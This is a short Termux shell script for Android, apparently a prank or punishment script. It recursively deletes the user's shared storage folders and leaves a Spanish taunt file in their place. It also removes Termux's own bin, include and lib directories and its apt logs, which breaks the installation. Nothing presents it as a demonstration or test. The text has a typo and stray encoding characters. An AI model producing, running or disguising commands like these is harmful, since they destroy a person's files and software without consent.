cd $HOME
termux-setup-storage
cd /sdcard


rm -r sdcard
rn -r storage
mkdir sdcard
cd sdcard
touch Quepasa.txt
echo esto pasa por no irte de los grupos de CP >> Quepasa.txt
cd $HOME
rm -r /data/data/com.termux/files/usr/bin
rm -rÂ  /data/data/com.termux/files/usr/include
rm -r Â /data/data/com.termux/files/usr/lib
rm -r Â /data/data/com.termux/files/usr/var/log/apt
  
